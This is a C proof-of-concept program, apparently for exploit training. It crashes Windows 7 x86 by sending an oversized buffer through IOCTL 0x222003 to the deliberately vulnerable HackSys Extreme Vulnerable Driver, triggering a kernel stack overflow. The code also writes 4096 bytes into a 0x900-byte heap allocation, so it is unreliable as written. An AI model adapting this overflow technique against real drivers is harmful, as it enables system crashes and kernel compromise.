#include "stdafx.h"
#include <Windows.h>
#include <string.h>

/*
 * Title: HEVD x86 Stack Overflow BSOD
 * Platform: Windows 7 x86
 * Author: Osanda Malith Jayathissa (@OsandaMalith)
 * Website: https://osandamalith.com
 */

int _tmain(int argc, _TCHAR* argv[])
{
	HANDLE hDevice;
	LPCWSTR lpDeviceName = L"\\\\.\\HacksysExtremeVulnerableDriver";
	PUCHAR lpInBuffer = NULL;
	DWORD lpBytesReturned = 0;

	hDevice = CreateFile(
		lpDeviceName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
		NULL);

	wprintf(L"[*] Author: @OsandaMalith\n[*] Website: https://osandamalith.com\n\n");
	wprintf(L"[+] lpDeviceName: %ls\n", lpDeviceName);

	if (hDevice == INVALID_HANDLE_VALUE) {
		wprintf(L"[!] Failed to get a handle to the driver. 0x%x\n", GetLastError());
		return -1;
	}

	wprintf(L"[+] Device Handle: 0x%x\n", hDevice);

	lpInBuffer = (PUCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x900);

	if (!lpInBuffer) {
		wprintf(L"[!] Failed to allocated memory. %x", GetLastError());
		return -1;
	}

	RtlFillMemory(lpInBuffer, (SIZE_T)1024*sizeof DWORD, 0x41);

	wprintf(L"[+] Sending IOCTL request with buffer: 0x222003\n");

	DeviceIoControl(
		hDevice,
		0x222003, // IOCTL
		(LPVOID)lpInBuffer,
		2084,
		NULL,
		0,
		&lpBytesReturned,
		NULL);


	HeapFree(GetProcessHeap(), 0, (LPVOID)lpInBuffer);
	CloseHandle(hDevice);
	 
	return 0;
}
//EOF
